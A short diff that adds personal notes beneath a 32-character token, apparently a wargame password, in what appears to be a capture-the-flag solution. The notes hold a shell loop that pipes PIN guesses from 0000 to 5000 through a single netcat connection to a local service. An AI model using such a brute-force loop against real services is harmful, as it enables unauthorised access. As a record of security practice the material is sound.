@@ -1,1 +1,10 @@
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Note:
+- Shell script with loop
+- Loop within one netcat connection
+  ```
+  for NUM in {0000..5000}; do
+    echo "PASSWORD $NUM"
+  done | nc localhost 30002
+  ```
